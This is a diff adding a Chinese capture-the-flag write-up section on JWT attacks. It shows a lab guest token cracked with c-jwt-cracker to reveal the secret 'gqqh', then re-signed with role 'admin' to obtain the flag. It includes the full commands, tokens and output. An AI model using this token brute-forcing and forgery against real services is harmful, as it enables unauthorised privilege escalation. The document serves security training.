@@ -4997,6 +4997,90 @@ token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcm
 
 ------
 
+### 弱密钥
+
+> 如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag。
+
+[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)是一款基于 C 语言编写的多线程 JWT（JSON Web Token）暴力破解工具，核心功能是通过暴力枚举的方式破解 JWT的密钥。若破解成功，攻击者可利用获取的密钥伪造合法 JWT，仅用于安全测试场景，禁止用于未授权的攻击行为。
+
+进入靶机后看到一个名为`Web Login`的登录框，包含账号、密码的输入框和登录按钮。
+
+打开Chrome的`Network`抓包，随便输入测试一下。输入账号`admin`和密码`123`，看到以下回显信息：
+
+> Hello admin(guest), only admin can get flag.
+
+`(guest)`说明我们的登录角色其实并不是`admin`。
+
+抓包后在`Cookie`中看到`token`信息如下：
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Sj5WN_tj2hIzQ_cqjL4prQCK7zfL8kHmUUyWt0-FMZg
+```
+
+安装c-jwt-cracker工具，使用该工具暴力破解靶机的JWT，成功获取密钥"gqqh"。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools]
+└─$ git clone https://github.com/brendan-rius/c-jwt-cracker.git
+正克隆到 'c-jwt-cracker'...
+remote: Enumerating objects: 73, done.
+remote: Counting objects: 100% (13/13), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 73 (delta 7), reused 6 (delta 6), pack-reused 60 (from 1)
+接收对象中: 100% (73/73), 23.02 KiB | 906.00 KiB/s, 完成.
+处理 delta 中: 100% (36/36), 完成.
+                                                                   
+┌──(t0ur1st㉿kali)-[~/tools/c-jwt-cracker]
+└─$ make                  
+gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o main.o main.c
+gcc -I /usr/include/openssl -g -std=gnu99 -O3   -c -o base64.o base64.c
+gcc -o jwtcrack main.o base64.o -lssl -lcrypto -lpthread
+
+┌──(t0ur1st㉿kali)-[~/tools/c-jwt-cracker]
+└─$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Sj5WN_tj2hIzQ_cqjL4prQCK7zfL8kHmUUyWt0-FMZg
+Secret is "gqqh"
+```
+
+直接用https://www.jwt.io/线上解密，先用`JWT Decoder`解密，输入密钥`gqqh`拿到`Json`数据。
+
+```
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+
+{
+  "username": "admin",
+  "password": "123",
+  "role": "guest"
+}
+
+gqqh
+```
+
+再用`JWT Encoder`，修改JWT中`role`字段为`admin`，生成新令牌后在`Burp Suite`中替换`token`发送请求，获取`flag`。或者用`HackBar`构造`GET`请求，点击`MODIFY HEADER`添加`Cookie`值，构造`GET`请求。
+
+```
+token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.awzUfVEJ5H92HUaY9N424G_Z05U96ZYd5846MOS2sp0
+```
+
+靶机的回显信息如下：
+
+> Hello admin(admin), only admin can get flag.
+> ctfhub{2b037343662d23b598c58d25}
+
+提交`ctfhub{2b037343662d23b598c58d25}`即可。
+
+------
+
+### 修改签名算法
+
+> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。
+
+
+
+------
+
 # MISC
 
 ## 数据库类流量
